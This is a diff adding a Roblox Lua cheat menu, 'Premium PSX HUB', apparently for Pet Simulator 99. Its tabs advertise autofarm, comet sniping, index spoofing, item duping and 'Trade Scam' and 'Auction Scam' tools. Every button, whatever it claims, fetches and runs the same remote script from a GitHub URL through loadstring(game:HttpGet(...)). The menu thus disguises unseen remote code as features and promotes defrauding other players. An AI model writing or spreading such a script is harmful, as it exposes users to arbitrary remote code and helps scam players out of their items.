@@ -1,0 +1,82 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Premium PSX HUB", "BloodTheme")
+
+
+local Main = Window:NewTab("Please Read")
+local MainSection = Main:NewSection("Dont leak source if u have")
+
+
+
+--main
+local Main = Window:NewTab("Autofarm")
+local MainSection = Main:NewSection("Autofarm")
+
+
+MainSection:NewButton("Autofarm", "Automatically farms for you", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyyz/PetChangerPsx99/main/Ps99PetChange"))()
+end)
+
+
+--second
+local CometSniper = Window:NewTab("CometSniper")
+local CometSniperSection = CometSniper:NewSection("Comet Sniper")
+
+
+CometSniperSection:NewButton("Small Comet Finder V1.5", "ServerHops till it finds comets", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyyz/PetChangerPsx99/main/Ps99PetChange"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+end)
+
+
+CometSniperSection:NewButton("Huge Comet Finder V1.5", "ServerHops till it finds comets", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyyz/PetChangerPsx99/main/Ps99PetChange"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+end)
+
+
+--third
+local IndexSpoofer = Window:NewTab("Index Spoofer")
+local IndexSpooferSection = IndexSpoofer:NewSection("Index Spoofer")
+
+
+IndexSpooferSection:NewButton("Index Spoofer", "Completes Your Index Instantly", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyyz/PetChangerPsx99/main/Ps99PetChange"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+end)
+
+
+--fourth
+local TradeScam = Window:NewTab("Trade Scam")
+local TradeScamSection = TradeScam:NewSection("Trade Scam")
+
+
+TradeScamSection:NewButton("Trade Scam", "Loads Up Private Trade Scam Script", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyyz/PetChangerPsx99/main/Ps99PetChange"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+end)
+
+
+--fifth
+local AuctionScam = Window:NewTab("Auction Scam")
+local AuctionScamSection = AuctionScam:NewSection("Auction Scam")
+
+
+AuctionScamSection:NewButton("Auction Scam", "Loads Up Private Auction Scam Script", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyyz/PetChangerPsx99/main/Ps99PetChange"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+end)
+
+
+--sixth
+local DayCareItemDupe = Window:NewTab("DayCare Item Dupe")
+local DayCareItemDupeSection = DayCareItemDupe:NewSection("DayCare Item Dupe")
+
+
+DayCareItemDupeSection:NewButton("DayCare Item Dupe", "Dupes The Items You Get In DayCare", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyyz/PetChangerPsx99/main/Ps99PetChange"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+end)
+
+
+--seventh
+local VisualPetChanger = Window:NewTab("Visual Pet Changer")
+local VisualPetChangerSection = VisualPetChanger:NewSection("Visual Pet Changer")
+
+
+VisualPetChangerSection:NewButton("Visual Pet Changer", "Changes Your Pet", function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyyz/PetChangerPsx99/main/Ps99PetChange"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+end)
